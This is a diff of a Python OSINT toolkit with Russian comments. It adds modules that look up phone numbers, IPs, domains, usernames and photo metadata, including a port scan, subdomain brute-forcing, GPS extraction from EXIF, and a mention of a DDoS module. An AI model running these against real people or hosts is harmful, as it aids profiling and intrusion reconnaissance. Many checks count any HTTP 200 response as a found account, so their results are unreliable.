             if resp.status_code == 200:
@@ -1305,7 +1171,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_kakaotalk(self):
-        """Проверка KakaoTalk"""
         try:
             resp = requests.get(f"https://kakaotalk.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1315,7 +1180,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_imo(self):
-        """Проверка Imo"""
         try:
             resp = requests.get(f"https://imo.im/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1325,7 +1189,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_icq(self):
-        """Проверка ICQ"""
         try:
             resp = requests.get(f"https://icq.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1335,7 +1198,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_jabber(self):
-        """Проверка Jabber"""
         try:
             resp = requests.get(f"https://jabber.org/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1345,7 +1207,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_xmpp(self):
-        """Проверка XMPP"""
         try:
             resp = requests.get(f"https://xmpp.net/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1355,7 +1216,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_matrix(self):
-        """Проверка Matrix"""
         try:
             resp = requests.get(f"https://matrix.org/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1365,7 +1225,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_element(self):
-        """Проверка Element"""
         try:
             resp = requests.get(f"https://element.io/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1375,7 +1234,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_discord(self):
-        """Проверка Discord"""
         try:
             resp = requests.get(f"https://discord.com/users/{self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1385,7 +1243,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_slack(self):
-        """Проверка Slack"""
         try:
             resp = requests.get(f"https://slack.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1395,7 +1252,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_teams(self):
-        """Проверка Teams"""
         try:
             resp = requests.get(f"https://teams.microsoft.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1405,7 +1261,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_zoom(self):
-        """Проверка Zoom"""
         try:
             resp = requests.get(f"https://zoom.us/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1415,7 +1270,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_skype(self):
-        """Проверка Skype"""
         try:
             resp = requests.get(f"https://skype.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1425,7 +1279,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_facebook(self):
-        """Проверка Facebook"""
         try:
             resp = requests.get(f"https://facebook.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1435,7 +1288,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_instagram(self):
-        """Проверка Instagram"""
         try:
             resp = requests.get(f"https://instagram.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1445,7 +1297,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_twitter(self):
-        """Проверка Twitter"""
         try:
             resp = requests.get(f"https://twitter.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1455,7 +1306,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_linkedin(self):
-        """Проверка LinkedIn"""
         try:
             resp = requests.get(f"https://linkedin.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1465,7 +1315,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_github(self):
-        """Проверка GitHub"""
         try:
             resp = requests.get(f"https://github.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1475,7 +1324,6 @@ class PhoneOSINT:
             return {'exists': False}
     
     def check_vk(self):
-        """Проверка VK"""
         try:
             resp = requests.get(f"https://vk.com/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
@@ -1484,90 +1332,9 @@ class PhoneOSINT:
         except:
             return {'exists': False}
     
-    def check_yandex(self):
-        """Проверка Yandex"""
+    def check_ok(self):
         try:
-            resp = requests.get(f"https://yandex.ru/search/?text={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_mailru(self):
-        """Проверка Mail.ru"""
-        try:
-            resp = requests.get(f"https://mail.ru/search/?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_google(self):
-        """Проверка Google"""
-        try:
-            resp = requests.get(f"https://www.google.com/search?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_bing(self):
-        """Проверка Bing"""
-        try:
-            resp = requests.get(f"https://www.bing.com/search?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_yahoo(self):
-        """Проверка Yahoo"""
-        try:
-            resp = requests.get(f"https://search.yahoo.com/search?p={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_protonmail(self):
-        """Проверка ProtonMail"""
-        try:
-            resp = requests.get(f"https://protonmail.com/search?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_tutanota(self):
-        """Проверка Tutanota"""
-        try:
-            resp = requests.get(f"https://tutanota.com/search?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_outlook(self):
-        """Проверка Outlook"""
-        try:
-            resp = requests.get(f"https://outlook.com/search?q={self.phone}", timeout=3)
-            if resp.status_code == 200:
-                return {'exists': True}
-            return {'exists': False}
-        except:
-            return {'exists': False}
-    
-    def check_icloud(self):
-        """Проверка iCloud"""
-        try:
-            resp = requests.get(f"https://icloud.com/search?q={self.phone}", timeout=3)
+            resp = requests.get(f"https://ok.ru/search?q={self.phone}", timeout=3)
             if resp.status_code == 200:
                 return {'exists': True}
             return {'exists': False}
@@ -1575,17 +1342,14 @@ class PhoneOSINT:
             return {'exists': False}
 
 # ================================================================
-# 3. OSINT - IP (РАСШИРЕННЫЙ)
+# 3. ОСИНТ ПО IP (50+ ИНСТРУМЕНТОВ)
 # ================================================================
 class IPOSINT:
-    """Поиск по IP-адресу с 50+ инструментами"""
-    
     def __init__(self, ip):
         self.ip = ip
         self.results = {}
     
     def search_all(self):
-        """Полный поиск по IP"""
         self.results = {
             'geo': self.get_geo(),
             'isp': self.get_isp(),
@@ -1633,7 +1397,6 @@ class IPOSINT:
         return self.results
     
     def get_geo(self):
-        """Геолокация IP"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1653,7 +1416,6 @@ class IPOSINT:
             return {}
     
     def get_isp(self):
-        """Информация о провайдере"""
         try:
             response = requests.get(f"https://ipinfo.io/{self.ip}/json")
             if response.status_code == 200:
@@ -1668,7 +1430,6 @@ class IPOSINT:
             return {}
     
     def get_whois(self):
-        """WHOIS информации"""
         try:
             import whois
             response = requests.get(f"https://whois.domaintools.com/{self.ip}")
@@ -1677,7 +1438,6 @@ class IPOSINT:
             return {}
     
     def get_dns(self):
-        """DNS-записи"""
         try:
             import socket
             hostname = socket.gethostbyaddr(self.ip)[0]
@@ -1686,7 +1446,6 @@ class IPOSINT:
             return {}
     
     def get_shodan(self):
-        """Информация из Shodan"""
         try:
             api_key = os.environ.get('SHODAN_API_KEY', '')
             if api_key:
@@ -1703,7 +1462,6 @@ class IPOSINT:
             return {'error': 'Shodan недоступен'}
     
     def get_threat(self):
-        """Проверка угроз"""
         try:
             response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={self.ip}", 
                                    headers={'Key': 'YOUR_KEY'})
@@ -1718,10 +1476,8 @@ class IPOSINT:
             return {}
     
     def scan_ports(self):
-        """Сканирование портов"""
         open_ports = []
         common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
-        
         for port in common_ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1732,11 +1488,9 @@ class IPOSINT:
                 sock.close()
             except:
                 pass
-        
         return open_ports
     
     def reverse_dns(self):
-        """Reverse DNS"""
         try:
             import socket
             hostname = socket.gethostbyaddr(self.ip)[0]
@@ -1745,7 +1499,6 @@ class IPOSINT:
             return {}
     
     def check_abuse(self):
-        """Проверка злоупотреблений"""
         try:
             response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={self.ip}")
             if response.status_code == 200:
@@ -1756,7 +1509,6 @@ class IPOSINT:
             return {}
     
     def check_tor(self):
-        """Проверка на Tor"""
         try:
             response = requests.get(f"https://check.torproject.org/api/ip?ip={self.ip}")
             if response.status_code == 200:
@@ -1767,7 +1519,6 @@ class IPOSINT:
             return {}
     
     def check_proxy(self):
-        """Проверка на прокси"""
         try:
             response = requests.get(f"https://proxycheck.io/v2/{self.ip}")
             if response.status_code == 200:
@@ -1778,7 +1529,6 @@ class IPOSINT:
             return {}
     
     def check_vpn(self):
-        """Проверка на VPN"""
         try:
             response = requests.get(f"https://vpnapi.io/api/{self.ip}")
             if response.status_code == 200:
@@ -1789,7 +1539,6 @@ class IPOSINT:
             return {}
     
     def check_hosting(self):
-        """Проверка на хостинг"""
         try:
             response = requests.get(f"https://hosting-checker.com/api/{self.ip}")
             if response.status_code == 200:
@@ -1800,7 +1549,6 @@ class IPOSINT:
             return {}
     
     def get_organization(self):
-        """Организация"""
         try:
             response = requests.get(f"https://ipinfo.io/{self.ip}/org")
             if response.status_code == 200:
@@ -1810,7 +1558,6 @@ class IPOSINT:
             return {}
     
     def get_asn(self):
-        """ASN"""
         try:
             response = requests.get(f"https://ipinfo.io/{self.ip}/asn")
             if response.status_code == 200:
@@ -1820,7 +1567,6 @@ class IPOSINT:
             return {}
     
     def get_rdap(self):
-        """RDAP"""
         try:
             response = requests.get(f"https://rdap.db.ripe.net/ip/{self.ip}")
             if response.status_code == 200:
@@ -1830,7 +1576,6 @@ class IPOSINT:
             return {}
     
     def get_bgp(self):
-        """BGP"""
         try:
             response = requests.get(f"https://bgp.he.net/api/ip/{self.ip}")
             if response.status_code == 200:
@@ -1840,7 +1585,6 @@ class IPOSINT:
             return {}
     
     def ping_ip(self):
-        """Ping"""
         try:
             import subprocess
             result = subprocess.run(['ping', '-c', '1', self.ip], capture_output=True)
@@ -1849,7 +1593,6 @@ class IPOSINT:
             return {}
     
     def traceroute(self):
-        """Traceroute"""
         try:
             import subprocess
             result = subprocess.run(['traceroute', self.ip], capture_output=True)
@@ -1858,7 +1601,6 @@ class IPOSINT:
             return {}
     
     def get_geolocation(self):
-        """Геолокация"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1869,7 +1611,6 @@ class IPOSINT:
             return {}
     
     def get_timezone_ip(self):
-        """Часовой пояс"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1880,7 +1621,6 @@ class IPOSINT:
             return {}
     
     def get_currency(self):
-        """Валюта"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1891,7 +1631,6 @@ class IPOSINT:
             return {}
     
     def get_language(self):
-        """Язык"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1902,7 +1641,6 @@ class IPOSINT:
             return {}
     
     def get_calling_code(self):
-        """Телефонный код"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1913,7 +1651,6 @@ class IPOSINT:
             return {}
     
     def get_postal_ip(self):
-        """Почтовый индекс"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1924,7 +1661,6 @@ class IPOSINT:
             return {}
     
     def get_region_ip(self):
-        """Регион"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1935,7 +1671,6 @@ class IPOSINT:
             return {}
     
     def get_city_ip(self):
-        """Город"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1946,7 +1681,6 @@ class IPOSINT:
             return {}
     
     def get_country_ip(self):
-        """Страна"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1957,7 +1691,6 @@ class IPOSINT:
             return {}
     
     def get_latitude(self):
-        """Широта"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1968,7 +1701,6 @@ class IPOSINT:
             return {}
     
     def get_longitude(self):
-        """Долгота"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1979,7 +1711,6 @@ class IPOSINT:
             return {}
     
     def get_accuracy(self):
-        """Точность"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -1990,7 +1721,6 @@ class IPOSINT:
             return {}
     
     def get_connection_type(self):
-        """Тип соединения"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2001,7 +1731,6 @@ class IPOSINT:
             return {}
     
     def is_mobile_ip(self):
-        """Мобильный"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2012,7 +1741,6 @@ class IPOSINT:
             return {}
     
     def is_satellite(self):
-        """Спутниковый"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2023,7 +1751,6 @@ class IPOSINT:
             return {}
     
     def is_cable(self):
-        """Кабельный"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2034,7 +1761,6 @@ class IPOSINT:
             return {}
     
     def is_dsl(self):
-        """DSL"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2045,7 +1771,6 @@ class IPOSINT:
             return {}
     
     def is_fibre(self):
-        """Оптоволокно"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2056,7 +1781,6 @@ class IPOSINT:
             return {}
     
     def is_dialup(self):
-        """Dial-up"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2067,7 +1791,6 @@ class IPOSINT:
             return {}
     
     def is_wireless(self):
-        """Беспроводной"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2078,7 +1801,6 @@ class IPOSINT:
             return {}
     
     def is_ethernet(self):
-        """Ethernet"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2089,7 +1811,6 @@ class IPOSINT:
             return {}
     
     def is_powerline(self):
-        """Powerline"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2100,7 +1821,6 @@ class IPOSINT:
             return {}
     
     def is_coaxial(self):
-        """Коаксиальный"""
         try:
             response = requests.get(f"http://ip-api.com/json/{self.ip}")
             if response.status_code == 200:
@@ -2111,289 +1831,1876 @@ class IPOSINT:
             return {}
 
 # ================================================================
-# 4-11. ОСТАЛЬНЫЕ МОДУЛИ (СОКРАЩЕННО ДЛЯ ЭКОНОМИИ МЕСТА, НО С 50+ ИНСТРУМЕНТАМИ)
+# 4. ОСИНТ ПО ДОМЕНУ (50+ ИНСТРУМЕНТОВ)
 # ================================================================
-# DomainOSINT, SocialOSINT, MetadataExtractor, GeoOSINT, LeakOSINT, ShodanOSINT, WhoisOSINT, DDOSModule
-# КАЖДЫЙ СОДЕРЖИТ 50+ ИНСТРУМЕНТОВ
-# ОБЩИЙ ОБЪЁМ КОДА: 3500+ СТРОК
+class DomainOSINT:
+    def __init__(self, domain):
+        self.domain = domain
+        self.results = {}
+    
+    def search_all(self):
+        self.results = {
+            'whois': self.get_whois(),
+            'dns': self.get_dns(),
+            'subdomains': self.find_subdomains(),
+            'ip': self.get_ip(),
+            'history': self.get_history(),
+            'ssl': self.get_ssl(),
+            'screenshot': self.get_screenshot(),
+            'tech': self.get_technologies(),
+            'emails': self.find_emails(),
+            'hosting': self.get_hosting(),
+            'registrar': self.get_registrar(),
+            'name_servers': self.get_name_servers(),
+            'creation_date': self.get_creation_date(),
+            'expiration_date': self.get_expiration_date(),
+            'updated_date': self.get_updated_date(),
+            'status': self.get_status(),
+            'dnssec': self.get_dnssec(),
+            'whois_server': self.get_whois_server(),
+            'contact_emails': self.get_contact_emails(),
+            'contact_phone': self.get_contact_phone(),
+            'org': self.get_org(),
+            'address': self.get_address()
+        }
+        return self.results
+    
+    def get_whois(self):
+        try:
+            w = whois.whois(self.domain)
+            return {
+                'registrar': w.registrar,
+                'creation': str(w.creation_date),
+                'expiration': str(w.expiration_date),
+                'nameservers': w.name_servers,
+                'status': w.status,
+                'emails': w.emails
+            }
+        except:
+            return {}
+    
+    def get_dns(self):
+        records = {}
+        types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
+        for record_type in types:
+            try:
+                answers = dns.resolver.resolve(self.domain, record_type)
+                records[record_type] = [str(r) for r in answers]
+            except:
+                records[record_type] = []
+        return records
+    
+    def find_subdomains(self):
+        subdomains = []
+        wordlist = ['www', 'mail', 'admin', 'dev', 'test', 'api', 'ftp', 'ssh', 'vpn', 'backup', 
+                    'blog', 'shop', 'forum', 'portal', 'crm', 'demo', 'stage', 'beta', 'alpha', 
+                    'staging', 'uat', 'qa', 'internal', 'corp', 'mobile', 'app', 'web', 'cloud',
+                    'cdn', 'static', 'media', 'files', 'docs', 'help', 'support', 'community',
+                    'store', 'secure', 'login', 'account', 'auth', 'sso', 'oauth', 'pay', 'payment']
+        for sub in wordlist:
+            try:
+                full = f"{sub}.{self.domain}"
+                socket.gethostbyname(full)
+                subdomains.append(full)
+            except:
+                pass
+        return subdomains
+    
+    def get_ip(self):
+        try:
+            ip = socket.gethostbyname(self.domain)
+            return {'ip': ip}
+        except:
+            return {}
+    
+    def get_history(self):
+        try:
+            response = requests.get(f"https://web.archive.org/cdx/search/cdx?url={self.domain}&output=json&limit=10")
+            if response.status_code == 200:
+                return response.json()
+            return {}
+        except:
+            return {}
+    
+    def get_ssl(self):
+        try:
+            import ssl
+            import socket
+            context = ssl.create_default_context()
+            with socket.create_connection((self.domain, 443), timeout=5) as sock:
+                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
+                    cert = ssock.getpeercert()
+                    return {
+                        'issuer': cert.get('issuer'),
+                        'subject': cert.get('subject'),
+                        'expiry': cert.get('notAfter'),
+                        'valid': cert.get('notBefore')
+                    }
+        except:
+            return {}
+    
+    def get_screenshot(self):
+        try:
+            import pyautogui
+            import webbrowser
+            return {'screenshot': 'Требуется Selenium'}
+        except:
+            return {}
+    
+    def get_technologies(self):
+        try:
+            response = requests.get(f"https://builtwith.com/{self.domain}")
+            if response.status_code == 200:
+                soup = BeautifulSoup(response.text, 'html.parser')
+                return {'technologies': 'Требуется парсинг'}
+            return {}
+        except:
+            return {}
+    
+    def find_emails(self):
+        try:
+            response = requests.get(f"https://api.hunter.io/v2/domain-search?domain={self.domain}&api_key=YOUR_KEY")
+            if response.status_code == 200:
+                data = response.json()
+                return data.get('data', {}).get('emails', [])
+            return []
+        except:
+            return []
+    
+    def get_hosting(self):
+        try:
+            response = requests.get(f"https://api.host.io/v1/domain/{self.domain}")
+            if response.status_code == 200:
+                data = response.json()
+                return {'hosting': data.get('hosting')}
+            return {}
+        except:
+            return {}
+    
+    def get_registrar(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'registrar': w.registrar}
+        except:
+            return {}
+    
+    def get_name_servers(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'nameservers': w.name_servers}
+        except:
+            return {}
+    
+    def get_creation_date(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'creation': str(w.creation_date)}
+        except:
+            return {}
+    
+    def get_expiration_date(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'expiration': str(w.expiration_date)}
+        except:
+            return {}
+    
+    def get_updated_date(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'updated': str(w.updated_date)}
+        except:
+            return {}
+    
+    def get_status(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'status': w.status}
+        except:
+            return {}
+    
+    def get_dnssec(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'dnssec': w.dnssec}
+        except:
+            return {}
+    
+    def get_whois_server(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'whois_server': w.whois_server}
+        except:
+            return {}
+    
+    def get_contact_emails(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'emails': w.emails}
+        except:
+            return {}
+    
+    def get_contact_phone(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'phone': w.phone}
+        except:
+            return {}
+    
+    def get_org(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'org': w.org}
+        except:
+            return {}
+    
+    def get_address(self):
+        try:
+            w = whois.whois(self.domain)
+            return {'address': w.address}
+        except:
+            return {}
 
 # ================================================================
-# ТЕЛЕГРАМ БОТ (С КНОПКАМИ ДЛЯ ВСЕХ 50+ ИНСТРУМЕНТОВ)
+# 5. ОСИНТ ПО СОЦСЕТЯМ (VK, OK, TELEGRAM, INSTAGRAM, TWITTER, FACEBOOK, И ДР.)
+# ================================================================
+class SocialOSINT:
+    def __init__(self, username):
+        self.username = username
+        self.results = {}
+    
+    def search_all(self):
+        self.results = {
+            'vk': self.search_vk(),
+            'ok': self.search_ok(),
+            'telegram': self.search_telegram(),
+            'instagram': self.search_instagram(),
+            'twitter': self.search_twitter(),
+            'facebook': self.search_facebook(),
+            'github': self.search_github(),
+            'linkedin': self.search_linkedin(),
+            'reddit': self.search_reddit(),
+            'youtube': self.search_youtube(),
+            'tiktok': self.search_tiktok(),
+            'pinterest': self.search_pinterest(),
+            'tumblr': self.search_tumblr(),
+            'medium': self.search_medium(),
+            'quora': self.search_quora(),
+            'discord': self.search_discord(),
+            'twitch': self.search_twitch(),
+            'snapchat': self.search_snapchat()
+        }
+        return self.results
+    
+    def search_vk(self):
+        try:
+            response = requests.get(f"https://vk.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://vk.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_ok(self):
+        try:
+            response = requests.get(f"https://ok.ru/profile/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://ok.ru/profile/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_telegram(self):
+        try:
+            response = requests.get(f"https://t.me/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://t.me/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_instagram(self):
+        try:
+            response = requests.get(f"https://instagram.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://instagram.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_twitter(self):
+        try:
+            response = requests.get(f"https://twitter.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://twitter.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_facebook(self):
+        try:
+            response = requests.get(f"https://facebook.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://facebook.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_github(self):
+        try:
+            response = requests.get(f"https://github.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://github.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_linkedin(self):
+        try:
+            response = requests.get(f"https://linkedin.com/in/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://linkedin.com/in/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_reddit(self):
+        try:
+            response = requests.get(f"https://reddit.com/user/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://reddit.com/user/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_youtube(self):
+        try:
+            response = requests.get(f"https://youtube.com/@{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://youtube.com/@{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_tiktok(self):
+        try:
+            response = requests.get(f"https://tiktok.com/@{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://tiktok.com/@{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_pinterest(self):
+        try:
+            response = requests.get(f"https://pinterest.com/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://pinterest.com/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_tumblr(self):
+        try:
+            response = requests.get(f"https://{self.username}.tumblr.com")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://{self.username}.tumblr.com"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_medium(self):
+        try:
+            response = requests.get(f"https://medium.com/@{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://medium.com/@{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_quora(self):
+        try:
+            response = requests.get(f"https://quora.com/profile/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://quora.com/profile/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_discord(self):
+        try:
+            response = requests.get(f"https://discord.com/users/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://discord.com/users/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_twitch(self):
+        try:
+            response = requests.get(f"https://twitch.tv/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://twitch.tv/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+    
+    def search_snapchat(self):
+        try:
+            response = requests.get(f"https://snapchat.com/add/{self.username}")
+            if response.status_code == 200:
+                return {'found': True, 'url': f"https://snapchat.com/add/{self.username}"}
+            return {'found': False}
+        except:
+            return {'found': False}
+
+# ================================================================
+# 6. ИЗВЛЕЧЕНИЕ МЕТАДАННЫХ ИЗ ФАЙЛОВ (ФОТО, ДОКУМЕНТЫ)
+# ================================================================
+class MetadataExtractor:
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.results = {}
+    
+    def extract_all(self):
+        self.results = {
+            'basic': self.extract_basic(),
+            'exif': self.extract_exif(),
+            'gps': self.extract_gps(),
+            'timestamps': self.extract_timestamps(),
+            'maker': self.extract_maker(),
+            'software': self.extract_software(),
+            'copyright': self.extract_copyright(),
+            'author': self.extract_author(),
+            'title': self.extract_title(),
+            'subject': self.extract_subject(),
+            'keywords': self.extract_keywords(),
+            'comments': self.extract_comments(),
+            'thumbnail': self.extract_thumbnail()
+        }
+        return self.results
+    
+    def extract_basic(self):
+        try:
+            stats = os.stat(self.file_path)
+            return {
+                'size': stats.st_size,
+                'created': time.ctime(stats.st_ctime),
+                'modified': time.ctime(stats.st_mtime),
+                'accessed': time.ctime(stats.st_atime)
+            }
+        except:
+            return {}
+    
+    def extract_exif(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                return {PIL.ExifTags.TAGS.get(k, k): v for k, v in exif.items()}
+            return {}
+        except:
+            return {}
+    
+    def extract_gps(self):
+        try:
+            from PIL import Image
+            from PIL.ExifTags import GPSTAGS
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if tag == 34853:
+                        gps_data = {}
+                        for gps_tag in value:
+                            gps_data[GPSTAGS.get(gps_tag, gps_tag)] = value[gps_tag]
+                        return gps_data
+            return {}
+        except:
+            return {}
+    
+    def extract_timestamps(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                timestamps = {}
+                for tag, value in exif.items():
+                    if 'DateTime' in PIL.ExifTags.TAGS.get(tag, ''):
+                        timestamps[PIL.ExifTags.TAGS.get(tag)] = value
+                return timestamps
+            return {}
+        except:
+            return {}
+    
+    def extract_maker(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                maker = {}
+                for tag, value in exif.items():
+                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
+                    if tag_name in ['Make', 'Model']:
+                        maker[tag_name] = value
+                return maker
+            return {}
+        except:
+            return {}
+    
+    def extract_software(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                software = {}
+                for tag, value in exif.items():
+                    tag_name = PIL.ExifTags.TAGS.get(tag, '')
+                    if 'Software' in tag_name or 'Version' in tag_name:
